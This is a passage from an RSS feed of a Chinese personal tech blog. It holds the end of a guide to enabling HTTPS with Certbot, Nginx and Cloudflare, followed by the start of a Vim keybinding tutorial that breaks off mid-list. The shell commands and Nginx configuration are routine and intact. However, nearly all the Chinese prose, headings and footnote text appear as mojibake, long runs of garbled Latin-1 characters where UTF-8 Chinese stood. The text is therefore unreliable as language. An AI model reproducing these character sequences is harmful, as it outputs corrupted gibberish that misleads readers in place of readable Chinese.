&lt;p&gt;Let&amp;#39;s Encrypt è¯ä¹¦æœ‰æ•ˆæœŸä¸º 90 å¤©ï¼ŒCertbot ä¼šè‡ªåŠ¨ç»­æœŸã€‚æ‰‹åŠ¨æµ‹è¯•ç»­æœŸï¼š&lt;a href=&quot;%E6%88%91%E6%89%8B%E5%8A%A8%E6%B5%8B%E8%AF%95%E7%BB%AD%E6%9C%9F%E5%A4%B1%E8%B4%A5%E4%BA%86...%E4%BD%86%E6%98%AF%E6%9C%80%E5%90%8E%E6%9C%89%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95,%E6%89%8B%E5%8A%A8%E5%BC%BA%E5%88%B6%E7%BB%AD%E6%9C%9F&quot;&gt;^2&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo certbot renew --dry-run
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;&lt;strong&gt;3. é…ç½® Nginx æ”¯æŒ HTTPS&lt;/strong&gt;&lt;/h3&gt;
&lt;h4&gt;&lt;strong&gt;æ­¥éª¤ 1ï¼šæ£€æŸ¥ Nginx é…ç½®æ–‡ä»¶&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Certbot å·²è‡ªåŠ¨ä¿®æ”¹é…ç½®ï¼Œä½†éœ€æ‰‹åŠ¨æ£€æŸ¥ã€‚&lt;br&gt;æ‰“å¼€é…ç½®æ–‡ä»¶ï¼ˆé€šå¸¸ä½äº &lt;code&gt;/etc/nginx/sites-available/default&lt;/code&gt;ï¼‰ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo nano /etc/nginx/sites-available/default
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;&lt;strong&gt;æ­¥éª¤ 2ï¼šç¡®ä¿ HTTPS é…ç½®æ­£ç¡®&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;é…ç½®æ–‡ä»¶åº”åŒ…å«ç±»ä¼¼ä»¥ä¸‹å†…å®¹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-nginx&quot;&gt;server {
    listen 80;
    server_name example.com www.example.com;
    return 301 https://$host$request_uri;  # å¼ºåˆ¶è·³è½¬åˆ° HTTPS
}

server {
    listen 443 ssl;
    server_name example.com www.example.com;

    ssl_certificate /etc/letsencrypt/live/example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/example.com/privkey.pem;

    root /var/www/html;
    index index.html index.htm;

    location / {
        try_files $uri $uri/ =404;
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;&lt;strong&gt;æ­¥éª¤ 3ï¼šæµ‹è¯•å¹¶é‡å¯ Nginx&lt;/strong&gt;&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo nginx -t          # æ£€æŸ¥é…ç½®è¯­æ³•
sudo systemctl restart nginx  # é‡å¯ Nginx
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;h3&gt;&lt;strong&gt;4. é…ç½® Cloudflare çš„ SSL è¯ä¹¦æº&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;å¦‚æœé€‰æ‹© &lt;strong&gt;Full (Strict) æ¨¡å¼&lt;/strong&gt;ï¼Œéœ€ç¡®ä¿ Cloudflare ä¿¡ä»»æœåŠ¡å™¨è¯ä¹¦ã€‚&lt;/p&gt;
&lt;h4&gt;&lt;strong&gt;æ­¥éª¤ 1ï¼šåœ¨ Cloudflare ä¸Šä¼ åŸå§‹è¯ä¹¦ï¼ˆå¯é€‰ï¼‰&lt;/strong&gt;&lt;a href=&quot;%E6%88%91%E6%B2%A1%E5%81%9A%E8%BF%99%E4%B8%80%E6%AD%A5&quot;&gt;^3&lt;/a&gt;&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;è¿›å…¥ &lt;strong&gt;SSL/TLS&lt;/strong&gt; â†’ &lt;strong&gt;Origin Server&lt;/strong&gt; â†’ &lt;strong&gt;Create Certificate&lt;/strong&gt;ã€‚&lt;/li&gt;
&lt;li&gt;ç”Ÿæˆå¹¶ä¸‹è½½è¯ä¹¦ï¼ˆåŒ…å« &lt;code&gt;.pem&lt;/code&gt; æ–‡ä»¶ï¼‰ã€‚&lt;/li&gt;
&lt;li&gt;å°†è¯ä¹¦ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œå¹¶æ›´æ–° Nginx é…ç½®ï¼š&lt;pre&gt;&lt;code class=&quot;language-nginx&quot;&gt;ssl_certificate /path/to/cloudflare-origin.crt;
ssl_certificate_key /path/to/cloudflare-origin.key;
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;&lt;strong&gt;5. éªŒè¯ HTTPS æ˜¯å¦ç”Ÿæ•ˆ&lt;/strong&gt;&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;åœ¨æµè§ˆå™¨ä¸­è®¿é—® &lt;code&gt;https://example.com&lt;/code&gt;ï¼Œæ£€æŸ¥æ˜¯å¦æ˜¾ç¤º &lt;strong&gt;å®‰å…¨é”æ ‡å¿—&lt;/strong&gt;ã€‚&lt;/li&gt;
&lt;li&gt;ä½¿ç”¨ &lt;a href=&quot;https://www.ssllabs.com/ssltest/&quot;&gt;SSL Labs æµ‹è¯•å·¥å…·&lt;/a&gt; æ£€æŸ¥ SSL é…ç½®è¯„åˆ†ï¼ˆç›®æ ‡ä¸º A æˆ– A+ï¼‰ã€‚&lt;a href=&quot;%E7%BB%93%E6%9E%9C%E4%B8%BAB%F0%9F%98%85&quot;&gt;^4&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;&lt;strong&gt;6. å¸¸è§é—®é¢˜è§£å†³&lt;/strong&gt;&lt;/h3&gt;
&lt;h4&gt;&lt;strong&gt;é—®é¢˜ 1ï¼šæµè§ˆå™¨æç¤ºâ€œä¸å®‰å…¨â€&lt;/strong&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;åŸå› &lt;/strong&gt;ï¼šç½‘ç«™ä¸­å­˜åœ¨æ··åˆå†…å®¹ï¼ˆHTTP èµ„æºï¼‰ã€‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;è§£å†³&lt;/strong&gt;ï¼š&lt;ol&gt;
&lt;li&gt;ç¡®ä¿æ‰€æœ‰èµ„æºï¼ˆå›¾ç‰‡ã€CSSã€JSï¼‰ä½¿ç”¨ HTTPS é“¾æ¥ã€‚&lt;/li&gt;
&lt;li&gt;åœ¨ Cloudflare å¯ç”¨ &lt;strong&gt;Automatic HTTPS Rewrites&lt;/strong&gt;ï¼ˆSSL/TLS â†’ Edge Certificatesï¼‰ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;strong&gt;é—®é¢˜ 2ï¼šNginx å¯åŠ¨å¤±è´¥&lt;/strong&gt;&lt;a href=&quot;%E6%88%91%E7%9A%84Shadowsocks%F0%9F%9A%80%E6%9C%8D%E5%8A%A1%E7%AB%AF%E4%B8%80%E5%BC%80%E5%A7%8B%E5%8D%A0%E7%94%A8%E4%BA%86443%E7%AB%AF%E5%8F%A3,%E4%BA%A7%E7%94%9F%E4%BA%86%E5%90%AF%E5%8A%A8%E5%A4%B1%E8%B4%A5%E7%9A%84%E7%8E%B0%E8%B1%A1&quot;&gt;^6&lt;/a&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;åŸå› &lt;/strong&gt;ï¼šé…ç½®æ–‡ä»¶è¯­æ³•é”™è¯¯æˆ–ç«¯å£å†²çªã€‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;è§£å†³&lt;/strong&gt;ï¼š&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo nginx -t  # æ£€æŸ¥é”™è¯¯æ—¥å¿—
sudo systemctl status nginx
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;strong&gt;é—®é¢˜ 3ï¼šè¯ä¹¦ç»­æœŸå¤±è´¥&lt;/strong&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;åŸå› &lt;/strong&gt;ï¼šCertbot æ— æ³•è‡ªåŠ¨ç»­æœŸã€‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;è§£å†³&lt;/strong&gt;ï¼š&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo certbot renew --force-renewal  # æ‰‹åŠ¨å¼ºåˆ¶ç»­æœŸ
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;strong&gt;æ€»ç»“&lt;/strong&gt;&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;åœ¨ Cloudflare å¯ç”¨ &lt;strong&gt;Full (Strict) SSL&lt;/strong&gt; å¹¶å¼ºåˆ¶ HTTPSã€‚&lt;/li&gt;
&lt;li&gt;ä½¿ç”¨ Certbot è‡ªåŠ¨è·å–å¹¶å®‰è£… Let&amp;#39;s Encrypt è¯ä¹¦ã€‚&lt;/li&gt;
&lt;li&gt;é…ç½® Nginx æ”¯æŒ HTTPS å¹¶é‡å¯æœåŠ¡ã€‚&lt;/li&gt;
&lt;li&gt;éªŒè¯ HTTPS ç”Ÿæ•ˆå¹¶è§£å†³å¸¸è§é—®é¢˜ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;å®Œæˆä»¥ä¸Šæ­¥éª¤åï¼Œæ‚¨çš„ç½‘ç«™å°†é€šè¿‡ HTTPS å®‰å…¨è®¿é—®ï¼Œæ•°æ®å…¨ç¨‹åŠ å¯†ï¼Œç”¨æˆ·ä¿¡ä»»åº¦å’Œ SEO æ’åä¹Ÿä¼šæå‡ã€‚å¦‚æœæœ‰å…·ä½“é—®é¢˜ï¼Œè¯·éšæ—¶å‘Šè¯‰æˆ‘ï¼ ğŸ˜Š&lt;/p&gt;
&lt;hr&gt;
&lt;blockquote&gt;
&lt;p&gt;æ³¨æ„æ­¤æ—¶waline.example.comé‡‡ç”¨HTTPS,ä½†dockeré…ç½®ä¾ç„¶ä½¿ç”¨&lt;a href=&quot;http://172.17.0.1:8360&quot;&gt;http://172.17.0.1:8360&lt;/a&gt; ,TLSåŠ å¯†æ˜¯å­˜åœ¨äºå®¢æˆ·ç«¯(æµè§ˆå™¨)å’Œç½‘ç«™æœåŠ¡å™¨ä¹‹é—´çš„.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;å¦‚æœNginxä¸Walineäº¤äº’è¿‡ç¨‹ä¸­å‡ºç°è«åå…¶å¦™çš„é”™è¯¯,å¯æŸ¥çœ‹/var/log/nginx/error.logæ–‡ä»¶,è¯´ä¸å®šèƒ½å¿«é€Ÿå®šä½åŸå› .&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;æ€»ç»“&lt;/h1&gt;
&lt;p&gt;è‡³æ­¤,æˆ‘ä»¬çš„ç½‘ç«™ç»ˆäºå¤§åŠŸå‘Šæˆäº†!ğŸ¤©&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯æœç´¢å¼•æ“(Googleå’Œç™¾åº¦ç­‰)çš„çˆ¬è™«ç›®å‰è¿˜æ²¡æœ‰æ‰¾åˆ°æˆ‘ä»¬çš„ç½‘ç«™.å¯ä»¥å‘æœç´¢å¼•æ“åé¦ˆ,åŠ å¿«è¿™ä¸€è¿‡ç¨‹.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;è‡ªç”±,å¼€æ”¾,æ˜¯äº’è”ç½‘çš„ç²¾ç¥.å¸Œæœ›æ¯ä¸ªäººéƒ½èƒ½åœ¨äº’è”ç½‘ä¸Šå±•ç¤ºè‡ªä¿¡å¤šå½©çš„è‡ªå·±!&lt;/p&gt;
&lt;/blockquote&gt;
</content:encoded><dc:creator>Dalekov</dc:creator><pubDate>Tue, 25 Mar 2025 16:00:00 GMT</pubDate></item><item><title>Vimä½¿ç”¨æ•™ç¨‹</title><link>https://www.tankimzeg.top/blog/vim%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</link><guid isPermaLink="true">https://www.tankimzeg.top/blog/vim%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</guid><description>éšæ—¶æŸ¥é˜…</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://www.tankimzeg.top/blog/vim%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/&quot;&gt;https://www.tankimzeg.top/blog/vim%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;&lt;a href=&quot;https://www.bilibili.com/video/BV1s4421A7he&quot;&gt;ã€Vimã€‘å¯èƒ½æ˜¯Bç«™æœ€ç³»ç»Ÿçš„Vimæ•™ç¨‹&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Edit text at the speed of thought.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;em&gt;ä¹‹å‰ç²—ç•¥å­¦ä¹ äº†ä¸€ä¸‹,å·²ç»åœ¨æˆ‘çš„VScode,Obsdianä¸­æŠ•å…¥ä½¿ç”¨.ä½†æ„Ÿè§‰ä¸å¤Ÿé«˜æ•ˆ,é‚è¡¥é½è¿™ä¸€è¯¾.&lt;/em&gt;&lt;/p&gt;
&lt;h1&gt;Vimæ¨¡å¼&lt;/h1&gt;
&lt;p&gt;Vimä¸»è¦æœ‰4ä¸­æ¨¡å¼:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Normal&lt;/li&gt;
&lt;li&gt;Insert&lt;/li&gt;
&lt;li&gt;Command&lt;/li&gt;
&lt;li&gt;Visual&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Normalæ¨¡å¼&lt;/h1&gt;
&lt;h2&gt;ç§»åŠ¨&lt;/h2&gt;
&lt;h3&gt;åŸºæœ¬ç§»åŠ¨&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;hjkl&lt;/code&gt;: ä¸Šä¸‹å·¦å³&lt;/li&gt;
&lt;li&gt;&lt;code&gt;gg&lt;/code&gt;: è·³åˆ°ç¬¬ä¸€è¡Œ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;G&lt;/code&gt;: è·³åˆ°æœ€åä¸€è¡Œ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Ctrl-U&lt;/code&gt; / &lt;code&gt;Ctrl-B&lt;/code&gt;: å¾€ä¸Šç¿»åŠé¡µ/ä¸€é¡µ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Ctrl-D&lt;/code&gt; / &lt;code&gt;Ctrl-F&lt;/code&gt;: å¾€ä¸‹ç¿»åŠé¡µ/ä¸€é¡µ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;{lineno}gg&lt;/code&gt;: è·³åˆ°&lt;code&gt;lineno&lt;/code&gt;è¡Œ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;zz/zt/zb&lt;/code&gt;: å…‰æ ‡è®¾ç½®ä¸ºå±å¹•å±…ä¸­/å±å¹•ç¬¬ä¸€è¡Œ/å±å¹•æœ€åä¸€è¡Œ&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;åŸºäºå•è¯çš„ç§»åŠ¨&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;w&lt;/code&gt;: è·³è½¬åˆ°ä¸‹ä¸€å¤„å•è¯çš„å¼€å¤´&lt;/li&gt;
&lt;li&gt;&lt;code&gt;b&lt;/code&gt;: è·³è½¬åˆ°ä¸Šä¸€å¤„å•è¯çš„å¼€å¤´&lt;/li&gt;
&lt;li&gt;&lt;code&gt;e&lt;/code&gt;: è·³è½¬åˆ°ä¸‹ä¸€å¤„å•è¯çš„ç»“å°¾&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ge&lt;/code&gt;: è·³è½¬åˆ°ä¸Šä¸€å¤„å•è¯çš„ç»“å°¾&lt;/li&gt;
&lt;li&gt;&lt;code&gt;wbe&lt;/code&gt;çš„å•è¯ä¼šä»¥æ ‡ç‚¹ä¸ºç•Œ,å¤§å†™ç‰ˆæœ¬&lt;code&gt;WBE&lt;/code&gt;å¯¹åº”çš„å•è¯æ˜¯è¿ç»­çš„éç©ºå­—ç¬¦&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;åŸºäºæœç´¢çš„ç§»åŠ¨&lt;/h3&gt;
&lt;p&gt;è¡Œå†…æœç´¢:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;f{char}&lt;/code&gt;/&lt;code&gt;t{char}&lt;/code&gt;: è·³è½¬åˆ°æœ¬è¡Œä¸‹ä¸€ä¸ª&lt;code&gt;char&lt;/code&gt;å­—ç¬¦å‡ºç°å¤„/å‡ºç°å‰&lt;/li&gt;
&lt;li&gt;&lt;code&gt;;&lt;/code&gt;/&lt;code&gt;,&lt;/code&gt;: å¿«é€Ÿå‘å/å‘å‰é‡å¤&lt;code&gt;ft&lt;/code&gt;æŸ¥æ‰¾&lt;/li&gt;
&lt;li&gt;&lt;code&gt;F{char}&lt;/code&gt;/&lt;code&gt;T{char}&lt;/code&gt;: å¾€å‰æœç´¢&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;æ–‡ä»¶ä¸­æœç´¢:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/{pattern}&lt;/code&gt;: è·³è½¬åˆ°æœ¬æ–‡ä»¶ä¸­ä¸‹ä¸€ä¸ª&lt;code&gt;pattern&lt;/code&gt;å‡ºç°å¤„&lt;/li&gt;
&lt;li&gt;&lt;code&gt;?{pattern}&lt;/code&gt;: è·³è½¬åˆ°æœ¬æ–‡ä»¶ä¸­ä¸Šä¸€ä¸ª&lt;code&gt;pattern&lt;/code&gt;å‡ºç°å¤„&lt;/li&gt;
&lt;li&gt;&lt;code&gt;{pattern}&lt;/code&gt;: å¯ä»¥æ˜¯æ­£åˆ™è¡¨è¾¾å¼&lt;/li&gt;
&lt;li&gt;&lt;code&gt;*&lt;/code&gt;: ç­‰ä»·äº &lt;code&gt;/{å½“å‰å…‰æ ‡ä¸‹çš„å•è¯}&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;nN&lt;/code&gt;: å¿«é€Ÿé‡å¤&lt;code&gt;/&lt;/code&gt;æŸ¥æ‰¾,&lt;code&gt;n&lt;/code&gt;å‘å;&lt;code&gt;N&lt;/code&gt;å‘å‰&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;åŸºäºæ ‡è®°çš„ç§»åŠ¨&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;m{mark}&lt;/code&gt;: æŠŠå½“å‰ä½ç½®æ ‡è®°ä¸º{mark}&lt;/li&gt;
&lt;li&gt;&lt;code&gt;`{mark}&lt;/code&gt; : è·³è½¬åˆ°åä¸º{mark}çš„æ ‡è®°å¤„
å†…ç½®æ ‡è®°:&lt;/li&gt;
&lt;li&gt;&lt;code&gt;``&lt;/code&gt;:ä¸Šæ¬¡è·³è½¬çš„ä½ç½®&lt;/li&gt;
&lt;li&gt;&lt;code&gt;`.&lt;/code&gt;: ä¸Šæ¬¡ä¿®æ”¹çš„ä½ç½®&lt;/li&gt;
&lt;li&gt;&lt;code&gt;`^&lt;/code&gt;: ä¸Šæ¬¡æ’å…¥çš„ä½ç½®&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;å…¶ä»–å®ç”¨çš„è·³è½¬&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;^&lt;/code&gt; / &lt;code&gt;$&lt;/code&gt;: è·³è½¬åˆ°æœ¬è¡Œçš„å¼€å§‹/ ç»“å°¾å¤„&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%&lt;/code&gt;: è·³è½¬åˆ°åŒ¹é…çš„é…å¯¹ç¬¦å·å¤„(å°æ‹¬å·,ä¸­æ‹¬å·,å¤§æ‹¬å·,æ³¨é‡Š)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Operator+Motion&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;{operator}{motion}&lt;/code&gt;: ä¸€æ¬¡ç¼–è¾‘æ“ä½œ
ä¸Šé¢ä»»ä½•ç§»åŠ¨éƒ½è§†ä¸ºä¸€æ¬¡motion.
å¸¸ç”¨çš„æ“ä½œç¬¦:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;c&lt;/code&gt;: ä¿®æ”¹(åˆ é™¤å†…å®¹å¹¶è¿›å…¥Insertæ¨¡å¼)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;d&lt;/code&gt;: åˆ é™¤&lt;/li&gt;
&lt;li&gt;&lt;code&gt;y&lt;/code&gt;: å¤åˆ¶&lt;/li&gt;
&lt;li&gt;&lt;code&gt;v&lt;/code&gt;: é€‰ä¸­,è¿›å…¥Visualæ¨¡å¼&lt;/li&gt;
&lt;li&gt;è¿æŒ‰ä¸¤æ¬¡,ä½œç”¨äºå½“å‰è¡Œ.(&lt;code&gt;yy/dd/cc&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;æ‰¹é‡æ“ä½œ&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;{count}{action}&lt;/code&gt;:é‡å¤æ‰§è¡Œæ“ä½œ
actionå¯ä»¥æ˜¯ç§»åŠ¨ä¹Ÿå¯ä»¥æ˜¯ç¼–è¾‘æ“ä½œ&lt;/p&gt;
&lt;h2&gt;Redo/Undo&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;.&lt;/code&gt;: é‡å¤ä¸Šä¸€æ¬¡ä¿®æ”¹&lt;/li&gt;
&lt;li&gt;&lt;code&gt;u&lt;/code&gt;: æ’¤é”€ä¸Šä¸€æ¬¡ä¿®æ”¹&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;Ctrl&amp;gt;-r&lt;/code&gt;: é‡åšä¸Šä¸€æ¬¡ä¿®æ”¹&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Operator+textobject&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;{operator}{textobject}&lt;/code&gt;:æ–‡æœ¬å¯¹è±¡æ“ä½œ
{textobject}: è¯­ä¹‰åŒ–æ–‡æœ¬ç‰‡æ®µ
æ ¼å¼: &lt;code&gt;i&lt;/code&gt; / &lt;code&gt;a&lt;/code&gt; + å¯¹è±¡
å¸¸ç”¨çš„å¯¹è±¡:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;w&lt;/code&gt; / &lt;code&gt;W&lt;/code&gt;, &lt;code&gt;s&lt;/code&gt;, &lt;code&gt;p&lt;/code&gt;: å•è¯,å¥å­,æ®µè½&lt;/li&gt;
&lt;li&gt;&lt;code&gt;(&lt;/code&gt; / &lt;code&gt;)&lt;/code&gt; , &lt;code&gt;[&lt;/code&gt; / &lt;code&gt;]&lt;/code&gt; , &lt;code&gt;{&lt;/code&gt; / &lt;code&gt;}&lt;/code&gt; , &lt;code&gt;&amp;lt;&lt;/code&gt; / &lt;code&gt;&amp;gt;&lt;/code&gt; , &lt;code&gt;&amp;#39;&lt;/code&gt; / &lt;code&gt;&amp;quot;&lt;/code&gt;: é…å¯¹ç¬¦å®šä¹‰çš„å¯¹è±¡
&lt;code&gt;i&lt;/code&gt; ä»£è¡¨å†…éƒ¨, &lt;code&gt;a&lt;/code&gt;åŒ…æ‹¬å‘¨å›´çš„ç©ºæ ¼æˆ–é…å¯¹ç¬¦&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Operatoræ“ä½œç¬¦è¡¥å……&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;gt;&lt;/code&gt; / &lt;code&gt;&amp;lt;&lt;/code&gt;: ç¼©è¿›/å–æ¶ˆç¼©è¿›&lt;/li&gt;
&lt;li&gt;&lt;code&gt;J&lt;/code&gt;:join, è¿æ¥ä¸¤è¡Œ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;gu&lt;/code&gt;/&lt;code&gt;gU&lt;/code&gt;/&lt;code&gt;g~&lt;/code&gt;:è½¬å°å†™/è½¬å¤§å†™/ç¿»è½¬å¤§å°å†™&lt;/li&gt;
&lt;li&gt;&lt;code&gt;g&amp;lt;Ctrl-A&amp;gt;&lt;/code&gt;: åˆ›å»ºé€’å¢åºåˆ—&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;Ctrl-a&amp;gt;&lt;/code&gt;/&lt;code&gt;&amp;lt;Ctrl-x&amp;gt;&lt;/code&gt;:å¢åŠ /å‡å°æ•°å­—&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Insertæ¨¡å¼&lt;/h1&gt;
&lt;p&gt;Normalæ¨¡å¼ä¸‹,é€šè¿‡ç‰¹å®šå‘½ä»¤è¿›å…¥Insertæ¨¡å¼:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;i&lt;/code&gt;:åœ¨å…‰æ ‡ä¹‹å‰å¼€å§‹è¾“å…¥&lt;/li&gt;
&lt;li&gt;&lt;code&gt;I&lt;/code&gt;: åœ¨æœ¬è¡Œå¼€å¤´å¼€å§‹è¾“å…¥&lt;/li&gt;
&lt;li&gt;&lt;code&gt;a&lt;/code&gt;: åœ¨å…‰æ ‡ä¹‹åå¼€å§‹è¾“å…¥&lt;/li&gt;
&lt;li&gt;&lt;code&gt;A&lt;/code&gt;: åœ¨æœ¬è¡Œæœ«å°¾å¼€å§‹è¾“å…¥&lt;/li&gt;
&lt;li&gt;&lt;code&gt;o&lt;/code&gt;:ä¸‹æ–¹æ’å…¥æ–°çš„ä¸€è¡Œ,ç„¶åå¼€å§‹è¾“å…¥&lt;/li&gt;
&lt;li&gt;&lt;code&gt;O&lt;/code&gt;: ä¸Šæ–¹æ’å…¥æ–°çš„ä¸€è¡Œ,ç„¶åå¼€å§‹è¾“å…¥&lt;/li&gt;
&lt;li&gt;&lt;code&gt;s&lt;/code&gt;: åˆ é™¤å½“å‰å…‰æ ‡å­—ç¬¦,ç„¶åå¼€å§‹è¾“å…¥&lt;/li&gt;
&lt;li&gt;&lt;code&gt;S&lt;/code&gt;: åˆ é™¤å½“å‰è¡Œ,ç„¶åå¼€å§‹è¾“å…¥&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Commandæ¨¡å¼&lt;/h1&gt;
&lt;p&gt;Normalæ¨¡å¼ä¸‹è¾“å…¥&lt;code&gt;:&lt;/code&gt;,è¿›å…¥Commandæ¨¡å¼&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;:w&lt;/code&gt;: ä¿å­˜æ–‡ä»¶&lt;/li&gt;
&lt;li&gt;&lt;code&gt;:q&lt;/code&gt;: é€€å‡º&lt;/li&gt;
&lt;li&gt;&lt;code&gt;:wq&lt;/code&gt;: ä¿å­˜å¹¶é€€å‡º&lt;/li&gt;
&lt;li&gt;&lt;code&gt;:h {command}&lt;/code&gt;: æ˜¾ç¤ºå…³äºå‘½ä»¤çš„å¸®åŠ©(VScode Vimä¸æ”¯æŒ)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;Esc&amp;gt;&lt;/code&gt;: å›åˆ°Normalæ¨¡å¼&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Exå‘½ä»¤æ ¼å¼&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;:[range] {excommand} [args]&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;range&lt;/code&gt;: ä½œç”¨çš„èŒƒå›´,é»˜è®¤æœ¬è¡Œ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;excommand&lt;/code&gt;: ä½¿ç”¨äºCommandæ¨¡å¼ä¸‹çš„ç‰¹æ®Šå‘½ä»¤&lt;/li&gt;
&lt;li&gt;&lt;code&gt;args&lt;/code&gt;: åç»­çš„å‚æ•°&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ä¸€äº›Ex Command(&lt;code&gt;[x]&lt;/code&gt;æ˜¯å¯„å­˜å™¨,æ˜¯å¯é€‰é¡¹):&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;:[range] d [x]&lt;/code&gt;: åˆ é™¤rangeä¸­çš„è¡Œåˆ°å¯„å­˜å™¨x&lt;/li&gt;
&lt;li&gt;&lt;code&gt;:[range] y [x]&lt;/code&gt;: å¤åˆ¶rangeä¸­çš„è¡Œåˆ°å¯„å­˜å™¨x&lt;/li&gt;
&lt;li&gt;&lt;code&gt;:[range] p&lt;/code&gt;: æ‰“å°rangeä¸­çš„è¡Œ&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;code&gt;range&lt;/code&gt;ä¸address:æŒ‡å®šèŒƒå›´&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;range&lt;/code&gt;ç”±ä¸€ä¸ªæˆ–ä¸¤ä¸ªaddressæ„æˆ,å³&lt;code&gt;{address}&lt;/code&gt; æˆ– &lt;code&gt;{address},{address}&lt;/code&gt;
addresså¯ä»¥æ˜¯:&lt;/p&gt;
&lt;ul&gt;
